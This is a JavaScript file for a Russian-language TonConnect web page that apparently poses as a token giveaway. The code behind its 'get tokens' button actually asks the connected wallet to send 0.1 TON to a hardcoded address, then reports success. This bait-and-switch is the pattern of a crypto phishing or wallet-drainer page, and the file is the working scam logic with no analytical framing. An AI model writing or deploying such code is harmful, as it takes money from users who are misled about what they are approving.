const manifestUrl = `${window.location.protocol}//${window.location.host}/tonconnect-manifest.json`;
const mainWallet = "UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: manifestUrl,
    language: 'ru'
});

// Основная кнопка подключения
document.getElementById('main-connect-btn').addEventListener('click', () => {
    openModal('connect-modal');
});

// Кнопка в модальном окне
document.getElementById('connect-wallet-btn').addEventListener('click', () => {
    tonConnectUI.openModal();
});

// Обработчик статуса кошелька
tonConnectUI.onStatusChange((wallet) => {
    if (wallet) {
        closeModal('connect-modal');
        openModal('confirm-modal');
    }
});

// Кнопка получения токенов
document.getElementById('get-tokens-btn').addEventListener('click', async () => {
    try {
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [{
                address: mainWallet,
                amount: '100000000'
            }]
        };
        await tonConnectUI.sendTransaction(transaction);
        alert('Транзакция успешно отправлена!');
    } catch (error) {
        alert('Ошибка: ' + error.message);
    }
});
